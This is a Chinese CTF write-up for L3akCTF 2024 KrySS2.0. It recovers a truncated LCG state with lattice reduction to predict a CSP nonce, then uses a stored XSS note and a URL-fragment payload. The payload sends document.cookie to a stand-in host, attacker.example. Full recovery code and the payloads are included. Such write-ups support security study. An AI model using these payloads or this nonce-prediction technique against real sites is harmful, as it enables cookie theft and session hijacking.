# L3akCTF 2024 KrySS2.0 Writeup

## 题目简述

应用关闭了 Jinja2 自动转义，笔记可以形成存储型 XSS；但响应设置了带 nonce 的 CSP，只有 nonce 正确的内联脚本才能执行。每个用户的 nonce 来自一个 384 位线性同余生成器（LCG），响应只泄露当前状态的最高 64 位，随后更新状态。

需要从连续截断输出恢复完整 LCG 状态，预测 Admin Bot 下一次访问笔记时使用的 CSP nonce，再通过 URL fragment 扩展受 69 字符限制的短脚本。

虽然最终载体是 Web XSS，决定性主障碍是截断 LCG 的格恢复，因此归入 Crypto。

## 解题过程

### 建立截断 LCG 方程

生成器为：

$$
x_{i+1}=(ax_i+b)\bmod m,
$$

其中 $a$、$b$、$m$ 均在源码中给出，状态宽度为 384 位。`/get_notes` 与 `/note/...` 的 CSP 只使用：

$$
h_i=x_i\mathbin{\operatorname{>>}}320.
$$

响应头形如：

```text
Content-Security-Policy:
script-src 'nonce-<最高 64 位十六进制>' 'unsafe-eval';
```

连续请求 12 次 `/get_notes` 即可收集 $h_0,\ldots,h_{11}$。令：

$$
Y_i=h_i2^{320},\qquad x_i=Y_i+e_i,
$$

则未知低位满足：

$$
0\le e_i<2^{320}.
$$

由 LCG 递推存在整数 $k_i$，使：

$$
a e_i-e_{i+1}+k_i m
=Y_{i+1}-aY_i-b.
$$

等式右侧已知，而每个 $e_i$ 落在很窄的区间。可将 $n-1$ 个精确等式与 $n$ 个误差范围一起构造成格上的最近向量问题。

### 用 LLL 与 Babai 恢复状态

下面保留了求解所需的完整核心。精确等式列乘大权重，误差列保持区间 $[0,2^{320}]$，然后用 LLL 约化基和 Babai nearest-plane 找到满足约束的格点：

```python
import re

import requests
from sage.all import *
from sage.modules.free_module_integer import IntegerLattice

BITS = 384
KNOWN_BITS = 64
LOW_BITS = BITS - KNOWN_BITS

a = 33512999749417623590472805508750190083700063232957133886465147715290688313218350272866001118397937483369479135959869
b = 38182801665815358509351762164752706491302718093964593212937534404130947785904732184486617725553411469308936847180409
m = 33828807364750862843652002141728143388944991056503758470531642562008967710932811368794217002908614490423558622239481


def babai_cvp(basis, target):
    reduced = IntegerLattice(
        basis,
        lll_reduce=True,
    ).reduced_basis
    gram = reduced.gram_schmidt()[0]
    difference = vector(QQ, target)

    for i in reversed(range(reduced.nrows())):
        coefficient = round(
            (difference * gram[i])
            / (gram[i] * gram[i])
        )
        difference -= reduced[i] * coefficient

    return vector(ZZ, vector(QQ, target) - difference)


def recover_states(high_parts):
    n = len(high_parts)
    lower_approximations = [
        Integer(value) << LOW_BITS
        for value in high_parts
    ]

    # n 个 e_i 与 n-1 个模数倍数，共 2n-1 个变量。
    basis = Matrix(ZZ, 2 * n - 1, 2 * n - 1)

    for i in range(n - 1):
        basis[i, i] = a
        basis[i + 1, i] = -1
        basis[n + i, i] = m
        basis[i, n - 1 + i] = 1

    basis[n - 1, 2 * n - 2] = 1

    equalities = [
        lower_approximations[i + 1]
        - a * lower_approximations[i]
        - b
        for i in range(n - 1)
    ]

    weight = (2 * n - 1) * max(
        abs(value)
        for value in basis.list()
    )

    for column in range(n - 1):
        basis.set_column(
            column,
            basis.column(column) * weight,
        )

    lower_bounds = [
        value * weight
        for value in equalities
    ] + [0] * n

    upper_bounds = [
        value * weight
        for value in equalities
    ] + [(1 << LOW_BITS)] * n

    target = vector(ZZ, [
        (low + high) // 2
        for low, high in zip(lower_bounds, upper_bounds)
    ])

    closest = babai_cvp(basis, target)
    coefficients = basis.transpose().solve_right(closest)
    errors = vector(ZZ, coefficients[:n])

    states = vector(
        ZZ,
        lower_approximations,
    ) + errors

    for i, state in enumerate(states):
        assert state >> LOW_BITS == high_parts[i]
        if i:
            assert state == (a * states[i - 1] + b) % m

    return states


def collect_high_parts(base_url, token):
    session = requests.Session()
    result = []

    for _ in range(12):
        response = session.get(
            f"{base_url}/get_notes",
            cookies={"token": token},
        )
        response.raise_for_status()

        csp = response.headers["Content-Security-Policy"]
        match = re.search(r"'nonce-([0-9a-f]+)'", csp)
        result.append(int(match.group(1), 16))

    return result
```

恢复出的 `states[0]` 是第一次观测到的状态。收集 $n$ 次响应后，数据库已经更新到 $x_n$；Admin Bot 打开笔记时，CSP 使用的正是这个状态的高 64 位。可以先逆推一次得到 $x_{-1}$，再正推 $n+1$ 次：

```python
high_parts = collect_high_parts(BASE_URL, TOKEN)
states = recover_states(high_parts)

previous = (
    (states[0] - b) * inverse_mod(a, m)
) % m

next_state = previous
for _ in range(len(high_parts) + 1):
    next_state = (a * next_state + b) % m

next_nonce = f"{next_state >> LOW_BITS:x}"
print(next_nonce)
```

预测完成后不要再访问会更新 nonce 的 `/get_notes` 或该笔记页面，否则状态前移，预测值会失效。

### 绕过 CSP 与长度限制

应用设置了：

```text
script-src 'nonce-<预测值>' 'unsafe-eval'
```

因此预测 nonce 允许内联脚本执行，而 `'unsafe-eval'` 又允许调用 `eval`。笔记最长 69 字符，使用以下短载荷：

```html
<script nonce=预测值>eval(`'`+document.baseURI)</script>
```

这段脚本只有约 66 字符。把长的泄露逻辑放进 URL fragment：

```text
/note/<username>/<noteid>#';fetch('https://attacker.example/collect?c='+document.cookie)
```

fragment 不会发送给服务端，但会保留在 `document.baseURI`。脚本在前面补一个单引号后，`eval` 的内容相当于：

```javascript
'当前页面 URL#';
fetch(
    'https://attacker.example/collect?c='
    + document.cookie
);
```

将该站内 URL 提交给 Admin Bot。Bot 会先设置非 HttpOnly 的 `flag` Cookie，再打开笔记；预测 nonce 通过 CSP，fragment 中的代码把 Cookie 发到比赛授权的接收端，得到：

```text
L3AK{N3v3r__trsut_4n_LCG_0r_4ny_on3_us1ng_1t_31138}
```

## 方法总结

- 只泄露 LCG 高位并不安全。连续状态满足公开线性递推，未知低位具有明确区间，可转成格上的 CVP。
- 构造格时，LCG 等式必须赋予远高于误差范围的权重，确保最近向量优先满足精确递推。
- CSP nonce 必须不可预测且每次独立生成。把可预测 PRNG 状态的截断输出当作 nonce，只是隐藏而非随机。
- 69 字符限制只约束存储的笔记；URL fragment 不经过服务端，可以在浏览器端作为第二阶段载荷。
- 此题同时需要 Crypto 与 Web 机制，但若没有截断 LCG 恢复就无法执行任何脚本，因此按决定性主障碍归入 Crypto。
